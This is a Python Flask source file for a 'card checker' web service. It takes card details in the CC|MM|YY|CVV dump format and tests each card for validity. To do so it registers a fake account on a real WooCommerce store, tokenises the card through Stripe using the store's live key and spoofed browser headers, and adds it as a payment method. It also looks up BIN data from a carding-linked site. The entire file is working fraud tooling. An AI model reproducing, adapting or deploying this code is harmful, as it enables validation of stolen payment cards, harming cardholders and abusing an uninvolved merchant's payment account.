from flask import Flask, request, jsonify
import requests
import re
import random
import string

app = Flask(__name__)

def full_stripe_check(cc, mm, yy, cvv):
    session = requests.Session()
    
    if len(yy) == 4:
        yy = yy[-2:]

    try:
        # Step 1 & 2: Get login nonce
        login_page_res = session.get('https://orevaa.com/my-account/')
        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
        if not login_nonce_match:
            return {"status": "Declined", "response": "Failed to get login nonce.", "decline_type": "process_error"}
        login_nonce = login_nonce_match.group(1)

        # Step 3: Register a new account
        random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
        register_data = {
            'email': random_email, 
            'password': 'Password123!', 
            'woocommerce-register-nonce': login_nonce,
            '_wp_http_referer': '/my-account/', 
            'register': 'Register',
        }
        session.post('https://orevaa.com/my-account/', data=register_data, allow_redirects=False)

        # Step 4: Get payment nonce
        payment_page_res = session.get('https://orevaa.com/my-account/add-payment-method/')
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        if not payment_nonce_match:
            return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
        ajax_nonce = payment_nonce_match.group(1)

        # Step 5: Get Stripe payment token - USING EXACT SAME REQUEST AS gate.py
        stripe_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        }

        stripe_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'US',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/fb4c8a3a98; stripe-js-v3/fb4c8a3a98; payment-element; deferred-intent',
            'referrer': 'https://orevaa.com',
            'time_on_page': '293254',
            'client_attribution_metadata[client_session_id]': 'dd158add-28af-4b7c-935c-a60ace5af345',
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': '15bdff4a-ba92-40aa-94e4-f0e376053c81',
            'guid': '6238c6c1-7a1e-4595-98af-359c1e147853c2bbaa',
            'muid': '2c200dbe-43a4-4a5f-a742-4d870099146696a4b8',
            'sid': 'a8893943-0bc5-4610-8232-e0f68a4ec4cc0e40de',
            'key': 'pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO',
            '_stripe_version': '2024-06-20',
        }

        stripe_response = session.post(
            'https://api.stripe.com/v1/payment_methods', 
            headers=stripe_headers, 
            data=stripe_data
        )
        
        print(f"Stripe Status: {stripe_response.status_code}")
        print(f"Stripe Response: {stripe_response.text}")
        
        if stripe_response.status_code == 200:
            stripe_json = stripe_response.json()
            payment_token = stripe_json.get('id')
            
            if payment_token and payment_token.startswith('pm_'):
                print(f"Successfully extracted payment token: {payment_token}")
            else:
                return {"status": "Declined", "response": "No payment token in successful response", "decline_type": "process_error"}
        else:
            error_msg = stripe_response.json().get('error', {}).get('message', 'Stripe API error')
            return {"status": "Declined", "response": f"Stripe error: {error_msg}", "decline_type": "process_error"}

        # Step 6: Submit to website
        site_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_token,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        final_response = session.post('https://orevaa.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
        response_json = final_response.json()

        if response_json.get('success'):
            return {"status": "Approved", "response": "Payment method successfully added.", "decline_type": "none"}
        else:
            error_message = response_json.get('data', {}).get('error', {}).get('message', 'Declined by website.')
            return {"status": "Declined", "response": error_message, "decline_type": "card_decline"}

    except Exception as e:
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}", "decline_type": "process_error"}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}')
        return response.json() if response.status_code == 200 else {}
    except Exception:
        return {}

@app.route('/check', methods=['GET'])
def check_card_endpoint():
    card_str = request.args.get('card')
    
    if not card_str:
        return jsonify({"error": "Please provide card details using the 'card' parameter in the URL."}), 400

    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
    if not match:
        return jsonify({"error": "Invalid card format. Use CC|MM|YY|CVV."}), 400

    cc, mm, yy, cvv = match.groups()
    check_result = full_stripe_check(cc, mm, yy, cvv)
    bin_info = get_bin_info(cc[:6])

    final_result = {
        "status": check_result["status"],
        "response": check_result["response"],
        "decline_type": check_result["decline_type"],
        "bin_info": {
            "brand": bin_info.get('brand', 'Unknown'),
            "type": bin_info.get('type', 'Unknown'),
            "country": bin_info.get('country_name', 'Unknown'),
            "country_flag": bin_info.get('country_flag', ''),
            "bank": bin_info.get('bank', 'Unknown'),
        }
    }
    return jsonify(final_result)

@app.route('/')
def home():
    return jsonify({"message": "Stripe Auth API is running!", "status": "active"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
